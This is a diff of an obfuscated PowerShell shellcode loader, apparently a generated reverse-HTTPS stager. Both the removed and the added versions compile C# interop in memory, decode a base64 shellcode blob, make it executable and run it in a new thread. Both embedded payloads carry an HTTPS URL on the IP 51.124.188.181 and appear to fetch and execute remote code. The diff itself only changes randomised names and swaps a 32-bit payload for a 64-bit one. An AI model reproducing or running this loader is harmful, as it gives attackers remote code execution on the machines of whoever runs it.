@@ -1,8 +1,8 @@
 Set-StrictMode -Version 2
-$s4UbG = @"
+$xubDG = @"
         using System;
         using System.Runtime.InteropServices;
-        namespace x33d {
+        namespace iogd {
                 public class func {
                         [Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
                         [Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
@@ -15,21 +15,21 @@ $s4UbG = @"
         }
 "@
 
-$n6W_ = New-Object Microsoft.CSharp.CSharpCodeProvider
-$rLxa = New-Object System.CodeDom.Compiler.CompilerParameters
-$rLxa.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
-$rLxa.GenerateInMemory = $True
-$f8Tt = $n6W_.CompileAssemblyFromSource($rLxa, $s4UbG)
+$aXQe = New-Object Microsoft.CSharp.CSharpCodeProvider
+$om = New-Object System.CodeDom.Compiler.CompilerParameters
+$om.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
+$om.GenerateInMemory = $True
+$ho = $aXQe.CompileAssemblyFromSource($om, $xubDG)
 
-[Byte[]]$nKXS4 = [System.Convert]::FromBase64String("/OiPAAAAYDHSieVki1Iwi1IMi1IUi3IoMf8Pt0omMcCsPGF8Aiwgwc8NAcdJde9Si1IQi0I8VwHQi0B4hcB0TAHQi1ggUItIGAHThcl0PEmLNIsx/wHWMcDBzw2sAcc44HX0A334O30kdeBYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS6YD///9daHR0cABod2luaFRoTHcmB//VaHQzMgBoY3J5cFRoTHcmB//VMdtTU1NTU2gEH527/9VQU2i7AQAA6CkCAABoAHQAdABwAHMAOgAvAC8ANQAxAC4AMQAyADQALgAxADgAOAAuADEAOAAxAC8ATABiAHUAcABtAEIAMABvAHgAXwA0AEYAWABnAFIAZgBaAHMAXwBnAFYAdwBZAFYAYwBEAGwASwBqAGIAdQBJAGwAUQBuAHkAbwBUADEAZABqAHQAbgBTAGwAcQBvADUANwA5AF8ATwBpAHkASABOAEkAUwBLAGcAMQBtAEsAbwBUAGcAaQBKAFcAUgBOADIAMgBWAHgASwA4AEoAAACDxyxQaEabHsL/1WgAAYAAU1NTV1NQaJgQs1v/1ZaD7BCJ4FeJx1doIacLYP/VhcB0TYtHBIXAdCpag+osagFTU1BqA2oDieCD7AyJ51dQUo1EJED/MGja3epJ/9WFwHQe6w+LRwiFwHQVagRYAcdIiQdqDFdqJlZo01idzv/VaAAzAACJ4GoEUGofVmjTWJ3O/9VqCl9TU1NTU1NWaJVYu5H/1YXAdQhPdevo0QAAAGoEieFqAInjUVNqTlZoeAQvJ//VhcB042oUieErIYnnUVdqA/8zaC1uqcP/1YXAdMroFAAAANIsJLUYnADZjFHAITDlskcIKp/vW2oEWYnKiwM7Bw+Fof///wHTAdfi8DHbU1ZoBYidcP/VhcAPhIj///9qQGgAEAAAaAAAQABTaFikU+X/1ZNTU4nnV2gAIAAAU1ZobCkkfv/VhcAPhFj///+LBwHDhcB14VjDX+id/v//NQAxAC4AMQAyADQALgAxADgAOAAuADEAOAAxAAAAu/C1olZqAFP/1Q==")
-[Uint32]$eBPL = 0
+[Byte[]]$fS = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZI/8lNMclBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5odHRwAEFWSInhScfCTHcmB//VU0m+Y3J5cHQzMgBBVkiJ4UnHwkx3Jgf/1VNTSInhU1pNMcBNMclTU0m6BB+duwAAAAD/1UmJxOgeAAAANQAxAC4AMQAyADQALgAxADgAOAAuADEAOAAxAAAAWkiJwUnHwLsBAABNMclJukabHsIAAAAA/9XoBAIAAGgAdAB0AHAAcwA6AC8ALwA1ADEALgAxADIANAAuADEAOAA4AC4AMQA4ADEALwAyAGQAMgBZAFIALQB0AEEAWABuADQATwBOAFEAOAAzAGIAYQBUAHIALQBBAHMATQBiAEgAMABnADcAMQAwAEEARABTAHMARQBCADIALQBqAGwAZwA3AFEAdQA4AF8AbABEAE8AUQBrAC0AMQBKADQAVAAwADEATwB3AHoAMQBTAEkALQBtAGcAcABaAHcATQBjAGEAUQBWAGEATQBCADIAdgBOAHYANgBRAE4ARwBEAFYAQwA3AGkAMwB0AHQASwBNAEIAYQBTAHIAMQBZAFQARABEAE0AdwBIAE8ANwBpAFQAYQA0AEEAZgAyAEsAQQB0AG4AZgBuAGkAegBKAGgAdQAzAHMAQwAzAGsAbQBUAGIAdgBpAGkAbABVAE8AbABsAHgAbQBEADMAagAyAHkAUgBCAFoAMwBjAGQAeABUAEkAOABEAFQAegB1AEgAbwAxAHkAbAByAE8AUABJAHEAMAB0AHAAMQBSAEQANABsAEsAQgBMAGwASgBGAGgAYgBmADQAbQBSAC0AMQB4ADQAcwBVAHAAUABBAEIAbQBOAG8AUABjAFgAVwBKAEkANABxAHUAQQBNADYARgBoAG8ASABSAE4AdgA3ADIAZABhAEwANwAAAEiJwVNaQVhNicVJg8AsTTHJU0jHwAABgABQU1NJx8KYELNb/9VIicZIg+ggSInnSIn5ScfCIacLYP/VhcAPhG0AAABIi0cIhcB0OkiJ2Uj/wUjB4SBRU1BIuAMAAAADAAAAUEmJ4EiD7CBIiedJiflMieFMiepJx8La3epJ/9WFwHQt6xJIi0cQhcB0I0iDxwhqA1hIiQdJifhqGEFZSInxaiZaSbrTWJ3OAAAAAP/VagpfSInxah9aUmgAMwAASYngagRBWUm601idzgAAAAD/1U0xwFNaSInxTTHJU1NTU0m6lVi7kQAAAAD/1YXAdQxI/890Auu76N4AAABIifFTWknHwgWInXD/1YXAdOlIifFqTlpJieBNicZTaghJieFJx8J4BC8n/9WFwHTKSYsOahhJieFJiedJKyFJieBNicZqA1pJui1uqcMAAAAA/9WFwA+En////+gUAAAA0iwktRicANmMUcAhMOWyRwgqn+9YSJZMifdJiw/zpg+Fdf///0iWU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJx8JsKSR+/9VIg8QghcAPhCn///9miwdIAcOFwHXRWMNYagBZScfC8LWiVv/V")
+[Uint32]$uL = 0
 
-$gI = [x33d.func]::VirtualAlloc(0, $nKXS4.Length + 1, [x33d.func+AllocationType]::Reserve -bOr [x33d.func+AllocationType]::Commit, [x33d.func+MemoryProtection]::ReadWrite)
-if ([Bool]!$gI) { $global:result = 3; return }
-[System.Runtime.InteropServices.Marshal]::Copy($nKXS4, 0, $gI, $nKXS4.Length)
+$fKNA = [iogd.func]::VirtualAlloc(0, $fS.Length + 1, [iogd.func+AllocationType]::Reserve -bOr [iogd.func+AllocationType]::Commit, [iogd.func+MemoryProtection]::ReadWrite)
+if ([Bool]!$fKNA) { $global:result = 3; return }
+[System.Runtime.InteropServices.Marshal]::Copy($fS, 0, $fKNA, $fS.Length)
 
-if ([x33d.func]::VirtualProtect($gI,[Uint32]$nKXS4.Length + 1, [x33d.func+MemoryProtection]::Execute, [Ref]$eBPL) -eq $true ) {
-        [IntPtr] $zi = [x33d.func]::CreateThread(0,0,$gI,0,0,0)
-        if ([Bool]!$zi) { $global:result = 7; return }
-        $eNg = [x33d.func]::WaitForSingleObject($zi, [x33d.func+Time]::Infinite)
+if ([iogd.func]::VirtualProtect($fKNA,[Uint32]$fS.Length + 1, [iogd.func+MemoryProtection]::Execute, [Ref]$uL) -eq $true ) {
+        [IntPtr] $yFOn6 = [iogd.func]::CreateThread(0,0,$fKNA,0,0,0)
+        if ([Bool]!$yFOn6) { $global:result = 7; return }
+        $i9v6 = [iogd.func]::WaitForSingleObject($yFOn6, [iogd.func+Time]::Infinite)
 }
